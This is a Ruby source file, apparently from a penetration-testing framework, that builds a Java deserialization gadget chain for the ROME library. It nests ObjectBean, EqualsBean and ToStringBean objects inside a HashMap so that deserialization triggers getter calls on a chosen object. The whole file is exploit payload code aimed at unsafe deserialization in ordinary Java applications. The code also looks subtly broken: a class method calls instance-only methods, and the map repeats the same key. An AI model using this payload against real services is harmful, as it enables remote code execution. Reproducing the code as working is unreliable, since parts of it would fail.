# -*- coding: binary -*-
require 'rex/java/serialization/metamodel'
require_relative 'util'


module Rex
  module Java
    module Serialization
      module Payloads
        class ROME
          def get_pkg(legacy)
            if legacy
              'Lcom/sun/syndication/feed/impl/'
            else
              'Lcom/rometools/rome/feed/impl/'
            end
          end

          def make_objectbean(obj, cls, legacy)
            prefix = ''
            prefix = '_' if legacy

            pkg = get_pkg(legacy)


            eqbean = Model::JavaObject.new(pkg + 'EqualsBean;', 
                                           prefix + 'beanClass' => Model::JavaClass.new(cls),
                                           prefix + 'obj' => obj)

            tsbean = Model::JavaObject.new(pkg + 'ToStringBean;', 
                                           prefix + 'beanClass' => Model::JavaClass.new(cls),
                                           prefix + 'obj' => obj)

            Model::JavaObject.new(pkg + 'ObjectBean;', 
                                  prefix + 'equalsBean' => eqbean,
                                  prefix + 'toStringBean' => tsbean)
          end

          def self.make_properties_invoke(obj, cls, legacy: false)
            inner = make_objectbean(obj, cls, legacy)
            outer = make_objectbean(inner, get_pkg(legacy) + 'ObjectBean;', legacy)
            Model::JavaObject.new('Ljava/util/HashMap;', 
                                  'elements' => { outer => nil, outer => nil })
          end
        end
      end
    end
  end
end
